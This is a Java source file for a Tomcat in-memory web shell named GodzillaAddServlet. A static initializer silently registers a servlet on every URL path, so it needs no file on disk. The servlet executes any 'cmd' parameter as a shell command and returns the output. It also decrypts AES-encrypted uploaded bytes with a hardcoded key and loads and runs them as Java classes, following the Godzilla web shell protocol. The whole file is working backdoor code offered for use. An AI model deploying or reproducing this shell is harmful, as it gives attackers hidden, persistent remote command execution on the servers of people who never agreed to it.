import org.apache.catalina.core.StandardContext;
import org.apache.catalina.loader.WebappClassLoaderBase;
import javax.crypto.Cipher;
import javax.crypto.spec.SecretKeySpec;
import javax.servlet.*;
import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import javax.servlet.http.HttpSession;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.lang.reflect.Method;
import java.math.BigInteger;
import java.security.MessageDigest;
import java.util.HashMap;
import java.util.Scanner;

public class GodzillaAddServlet extends ClassLoader implements Servlet{
    static {
        final String name = "AutoAddServlet";
        final String urlPattern = "/*";
        try {
            WebappClassLoaderBase webappClassLoaderBase = (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();
            StandardContext standardContext = (StandardContext) webappClassLoaderBase.getResources().getContext();

            ClassLoader z = null;
            GodzillaAddServlet evilServlet = new GodzillaAddServlet(z);

            // 创建并配置wrapper
            org.apache.catalina.Wrapper evilWrapper = standardContext.createWrapper();
            evilWrapper.setName(name);
            evilWrapper.setLoadOnStartup(1);

            evilWrapper.setServlet(evilServlet);
            evilWrapper.setServletClass(evilServlet.getClass().getName());

            // 将wrapper添加到children中
            standardContext.addChild(evilWrapper);

            // 添加mapping内容
            standardContext.addServletMapping(urlPattern, name);
        } catch (Exception hi) {
            //hi.printStackTrace();
        }
    }

    @Override
    public void init(ServletConfig config) throws ServletException {
        System.out.println("GodzillaAddServlet Start ......");
    }

    @Override
    public ServletConfig getServletConfig() {
        return null;
    }

    @Override
    public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException {
        try {
            System.out.println("Do Servlet ......");
            // 获取request和response对象
            HttpServletRequest request = (HttpServletRequest) servletRequest;
            HttpServletResponse response = (HttpServletResponse)servletResponse;
            HttpSession session = request.getSession();

            // Cmd MemShell
            String cmd = request.getParameter("cmd");
            if(cmd != null && !cmd.isEmpty()){
                boolean isLinux = true;
                String osTyp = System.getProperty("os.name");
                if (osTyp != null && osTyp.toLowerCase().contains("win")) {
                    isLinux = false;
                }
                String[] cmds = isLinux ? new String[]{"/bin/sh", "-c", cmd} : new String[]{"cmd.exe", "/c", cmd};
                InputStream in = Runtime.getRuntime().exec(cmds).getInputStream();
                Scanner s = new Scanner(in).useDelimiter("\\A");
                String output = s.hasNext() ? s.next() : "";
                response.getWriter().write(output);
                response.getWriter().flush();
            }

            String Pwd = "pass";
            String xc = "3c6e0b8a9c15224a";
            String md5 = md5(Pwd + xc);
            byte[] data = base64Decode(request.getParameter(Pwd));
            data = x(data, false);
            if (session.getAttribute("payload") == null) {
                session.setAttribute("payload", (new GodzillaAddServlet(getClass().getClassLoader())).Q(data));
            } else {
                request.setAttribute("parameters", data);
                ByteArrayOutputStream arrOut = new ByteArrayOutputStream();
                Object f = ((Class)session.getAttribute("payload")).newInstance();
                f.equals(arrOut);
                f.equals(data);
                response.getWriter().write(md5.substring(0, 16));
                f.toString();
                response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));
                response.getWriter().write(md5.substring(16));
            }
        }catch (Exception e){
            e.printStackTrace();
        }
    }

    @Override
    public String getServletInfo() {
        return null;
    }

    @Override
    public void destroy() {

    }

    public GodzillaAddServlet(ClassLoader z) {
        super(z);
    }

    public Class Q(byte[] cb) {
        return defineClass(cb, 0, cb.length);
    }

    public byte[] x(byte[] s, boolean m) {
        String xc = "3c6e0b8a9c15224a";
        try {
            Cipher c = Cipher.getInstance("AES");
            c.init(m ? 1 : 2, new SecretKeySpec(xc.getBytes(), "AES"));
            return c.doFinal(s);
        } catch (Exception e) {
            return null;
        }
    }

    public static String md5(String s) {
        String ret = null;
        try {
            MessageDigest m = MessageDigest.getInstance("MD5");
            m.update(s.getBytes(), 0, s.length());
            ret = (new BigInteger(1, m.digest())).toString(16).toUpperCase();
        } catch (Exception exception) {}
        return ret;
    }

    public static String base64Encode(byte[] bs) throws Exception {
        String value = null;
        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object Encoder = base64.getMethod("getEncoder", null).invoke(base64, null);
            value = (String)Encoder.getClass().getMethod("encodeToString", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });
        } catch (Exception e) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Encoder");
                Object Encoder = base64.newInstance();
                value = (String)Encoder.getClass().getMethod("encode", new Class[] { byte[].class }).invoke(Encoder, new Object[] { bs });
            } catch (Exception exception) {}
        }
        return value;
    }

    public static byte[] base64Decode(String bs) throws Exception {
        byte[] value = null;
        try {
            Class<?> base64 = Class.forName("java.util.Base64");
            Object decoder = base64.getMethod("getDecoder", null).invoke(base64, null);
            value = (byte[])decoder.getClass().getMethod("decode", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
        } catch (Exception e) {
            try {
                Class<?> base64 = Class.forName("sun.misc.BASE64Decoder");
                Object decoder = base64.newInstance();
                value = (byte[])decoder.getClass().getMethod("decodeBuffer", new Class[] { String.class }).invoke(decoder, new Object[] { bs });
            } catch (Exception exception) {}
        }
        return value;
    }
}